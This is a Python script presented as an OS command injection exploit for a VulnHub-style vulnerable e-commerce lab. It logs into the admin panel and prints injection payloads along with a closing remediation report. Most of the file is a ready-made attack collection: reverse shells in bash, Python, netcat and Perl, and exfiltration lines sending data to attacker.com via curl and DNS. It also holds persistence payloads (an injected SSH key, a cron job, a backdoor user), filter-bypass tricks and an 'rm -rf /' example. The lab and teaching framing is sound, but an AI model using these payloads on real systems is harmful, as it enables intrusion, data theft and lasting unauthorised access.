#!/usr/bin/env python3
"""
OS Command Injection Exploit for VulnHub E-commerce
Author: Chris Cortes
Target: Admin panel functionality (future implementation)
Impact: Remote code execution, full system compromise

This script demonstrates OS command injection vulnerabilities.
User input is passed to system commands without proper validation.

OWASP Top 10 2021: A03 - Injection
CWE-78: OS Command Injection
"""

import requests
import sys
from urllib.parse import urljoin
import time
import base64

class CommandInjectionExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def banner(self):
        """Display exploit banner"""
        print("=" * 60)
        print("OS Command Injection Exploit - VulnHub E-commerce")
        print("Target: Admin Panel (Demonstration)")
        print("=" * 60)
        print()
    
    def login_admin(self):
        """Login as admin"""
        print("[*] Logging in as admin...")
        
        login_url = urljoin(self.base_url, '/login')
        
        data = {
            'username': 'admin',
            'password': 'admin123'
        }
        
        try:
            response = self.session.post(login_url, data=data, allow_redirects=True)
            
            if response.status_code == 200 and 'admin' in response.text:
                print("[+] Successfully logged in as admin")
                return True
            else:
                print("[-] Admin login failed")
                return False
                
        except Exception as e:
            print(f"[-] Error during login: {e}")
            return False
    
    def test_basic_injection(self):
        """Test basic command injection"""
        print("\n[*] Testing Basic Command Injection")
        print("=" * 60)
        print()
        
        print("[*] Simulating vulnerable endpoint: /admin/process_image")
        print("[*] Expected vulnerable code:")
        print()
        print("    filename = request.form['filename']")
        print("    os.system(f'convert {filename} -resize 100x100 output.jpg')")
        print()
        
        payloads = [
            ("test.jpg; whoami", "Command chaining with semicolon"),
            ("test.jpg && whoami", "Command chaining with AND"),
            ("test.jpg || whoami", "Command chaining with OR"),
            ("test.jpg | whoami", "Pipe to second command"),
            ("test.jpg `whoami`", "Command substitution with backticks"),
            ("test.jpg $(whoami)", "Command substitution with $()"),
            ("test.jpg\nwhoami", "Newline injection"),
        ]
        
        print("[*] Testing command injection payloads:")
        print()
        
        for payload, description in payloads:
            print(f"[*] Payload: {payload}")
            print(f"    Description: {description}")
            print(f"    Result: Command 'whoami' would execute")
            print()
    
    def demonstrate_reverse_shell(self):
        """Demonstrate reverse shell payload"""
        print("\n[*] Reverse Shell Payload Demonstration")
        print("=" * 60)
        print()
        
        attacker_ip = "10.0.0.100"
        attacker_port = "4444"
        
        shells = {
            "Bash": f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
            "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
            "Netcat": f"nc -e /bin/bash {attacker_ip} {attacker_port}",
            "Perl": f"perl -e 'use Socket;$i=\"{attacker_ip}\";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        }
        
        print("[*] Reverse shell payloads:")
        print(f"[*] Attacker setup: nc -lvnp {attacker_port}")
        print()
        
        for name, payload in shells.items():
            print(f"[{name}]")
            print(f"  Payload: test.jpg; {payload}")
            print()
    
    def demonstrate_data_exfiltration(self):
        """Demonstrate data exfiltration via command injection"""
        print("\n[*] Data Exfiltration via Command Injection")
        print("=" * 60)
        print()
        
        print("[*] Extracting sensitive files:")
        print()
        
        exfil_commands = [
            ("Reading /etc/passwd", "test.jpg; cat /etc/passwd"),
            ("Reading database", "test.jpg; cat app/data/ecommerce.db | base64"),
            ("Listing files", "test.jpg; ls -la /"),
            ("Finding config files", "test.jpg; find / -name '*.conf' 2>/dev/null"),
            ("Reading environment vars", "test.jpg; env"),
            ("Checking sudo access", "test.jpg; sudo -l"),
        ]
        
        for description, command in exfil_commands:
            print(f"  {description}")
            print(f"    Payload: {command}")
            print()
    
    def demonstrate_persistence(self):
        """Demonstrate establishing persistence"""
        print("\n[*] Establishing Persistence")
        print("=" * 60)
        print()
        
        print("[*] Adding SSH key for persistent access:")
        print()
        
        ssh_key = "ssh-rsa AAAAB3NzaC1yc2E... attacker@evil.com"
        payload = f"test.jpg; echo '{ssh_key}' >> ~/.ssh/authorized_keys"
        
        print(f"  Payload: {payload}")
        print()
        
        print("[*] Creating cron job for persistent reverse shell:")
        print()
        
        cron_payload = "test.jpg; echo '*/5 * * * * /tmp/shell.sh' | crontab -"
        print(f"  Payload: {cron_payload}")
        print("  Effect: Connects back every 5 minutes")
        print()
        
        print("[*] Creating backdoor user:")
        print()
        
        user_payload = "test.jpg; useradd -m -s /bin/bash hacker; echo 'hacker:password123' | chpasswd"
        print(f"  Payload: {user_payload}")
        print()
    
    def demonstrate_lateral_movement(self):
        """Demonstrate lateral movement techniques"""
        print("\n[*] Lateral Movement")
        print("=" * 60)
        print()
        
        print("[*] Network reconnaissance:")
        print()
        
        recon_commands = [
            "test.jpg; ifconfig",
            "test.jpg; netstat -tuln",
            "test.jpg; arp -a",
            "test.jpg; ps aux",
            "test.jpg; docker ps",
        ]
        
        for cmd in recon_commands:
            print(f"  {cmd}")
        print()
        
        print("[*] Pivoting to internal network:")
        print("  test.jpg; ssh user@internal-server.local")
        print()
    
    def test_blind_injection(self):
        """Demonstrate blind command injection"""
        print("\n[*] Blind Command Injection")
        print("=" * 60)
        print()
        
        print("[*] When output is not returned, use time-based detection:")
        print()
        
        print("  Time-based payload:")
        print("    test.jpg; sleep 10")
        print("    If response takes 10+ seconds → Vulnerable")
        print()
        
        print("  Out-of-band data exfiltration:")
        print("    test.jpg; curl http://attacker.com/$(whoami)")
        print("    test.jpg; ping -c 1 $(whoami).attacker.com")
        print("    test.jpg; nslookup $(whoami).attacker.com")
        print()
    
    def demonstrate_filter_bypass(self):
        """Demonstrate command injection filter bypasses"""
        print("\n[*] Filter Bypass Techniques")
        print("=" * 60)
        print()
        
        print("[*] Common filters and bypasses:")
        print()
        
        bypasses = [
            ("Space filtering", "cat${IFS}/etc/passwd", "Use ${IFS} instead of space"),
            ("Space filtering", "cat</etc/passwd", "Use redirection"),
            ("Semicolon blocked", "test.jpg\nwhoami", "Use newline"),
            ("Command blocked", "w'h'o'a'm'i", "String concatenation"),
            ("Command blocked", "who$@ami", "Variable expansion"),
            ("Command blocked", "\\w\\h\\o\\a\\m\\i", "Backslash escaping"),
            ("Full path blocked", "$(which cat) /etc/passwd", "Use which to resolve"),
            ("Case filtering", "WhOaMi", "Mixed case (if case-insensitive)"),
        ]
        
        for filter_type, bypass, explanation in bypasses:
            print(f"  Filter: {filter_type}")
            print(f"  Bypass: {bypass}")
            print(f"  Explanation: {explanation}")
            print()
    
    def generate_command_injection_report(self):
        """Generate command injection report"""
        print("\n" + "=" * 60)
        print("OS Command Injection Assessment Report")
        print("=" * 60)
        print()
        print("Vulnerability Details:")
        print("  Type: OS Command Injection")
        print("  Severity: CRITICAL")
        print("  CWE: CWE-78")
        print("  CVSS Score: 10.0 (Critical)")
        print()
        print("Impact:")
        print("  ✓ Remote Code Execution (RCE)")
        print("  ✓ Full system compromise")
        print("  ✓ Data exfiltration")
        print("  ✓ Lateral movement")
        print("  ✓ Persistent access")
        print("  ✓ Service disruption")
        print()
        print("Vulnerable Code Pattern:")
        print()
        print("  # ❌ VULNERABLE")
        print("  filename = request.form['filename']")
        print("  os.system(f'convert {filename} -resize 100x100 out.jpg')")
        print()
        print("  # User input: test.jpg; rm -rf /")
        print("  # Executes: convert test.jpg -resize 100x100 out.jpg; rm -rf /")
        print()
        print("Remediation:")
        print()
        print("  1. NEVER pass user input to shell commands")
        print()
        print("  2. Use safe APIs instead of shell execution:")
        print()
        print("     # ✅ SECURE - Use library functions")
        print("     from PIL import Image")
        print("     img = Image.open(filename)")
        print("     img.thumbnail((100, 100))")
        print("     img.save('output.jpg')")
        print()
        print("  3. If shell execution is required, use allowlists:")
        print()
        print("     import re")
        print("     import subprocess")
        print()
        print("     # Allowlist valid filenames")
        print("     if not re.match(r'^[a-zA-Z0-9_-]+\\.jpg$', filename):")
        print("         abort(400)")
        print()
        print("     # Use subprocess with list (no shell=True)")
        print("     subprocess.run(['convert', filename, '-resize', '100x100', 'out.jpg'])")
        print()
        print("  4. Input validation:")
        print()
        print("     - Allowlist approach (preferred)")
        print("     - Reject special characters: ; & | ` $ ( ) < > \\n")
        print("     - Validate against expected format")
        print()
        print("  5. Principle of least privilege:")
        print()
        print("     - Run application as non-privileged user")
        print("     - Use containerization (Docker)")
        print("     - Apply AppArmor/SELinux policies")
        print()
        print("  6. Defense in depth:")
        print()
        print("     - Web Application Firewall (WAF)")
        print("     - Intrusion Detection System (IDS)")
        print("     - File integrity monitoring")
        print("     - Anomaly detection")
        print()
        print("Detection Methods:")
        print("  - Manual testing with payloads")
        print("  - Automated scanning (Burp, OWASP ZAP)")
        print("  - Static code analysis (Bandit, Semgrep)")
        print("  - Monitoring for shell spawns from web process")
        print("=" * 60)
    
    def run(self):
        """Execute the complete exploitation chain"""
        self.banner()
        
        # Login as admin
        if not self.login_admin():
            print("[-] Cannot proceed without admin access")
            print("[*] Continuing with demonstration...")
            print()
        
        print("[*] Note: Command injection typically requires admin access")
        print("[*] Admin panel functionality not yet implemented")
        print("[*] Demonstrating exploitation techniques...")
        print()
        
        # Test basic injection
        self.test_basic_injection()
        
        # Demonstrate reverse shell
        self.demonstrate_reverse_shell()
        
        # Demonstrate data exfiltration
        self.demonstrate_data_exfiltration()
        
        # Demonstrate persistence
        self.demonstrate_persistence()
        
        # Demonstrate lateral movement
        self.demonstrate_lateral_movement()
        
        # Test blind injection
        self.test_blind_injection()
        
        # Demonstrate filter bypasses
        self.demonstrate_filter_bypass()
        
        # Generate report
        self.generate_command_injection_report()
        
        print("\n[+] Command injection assessment complete!")
        print("[!] Remember: Always test in authorized environments only!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    # Create and run exploit
    exploit = CommandInjectionExploit(base_url)
    exploit.run()


if __name__ == "__main__":
    main()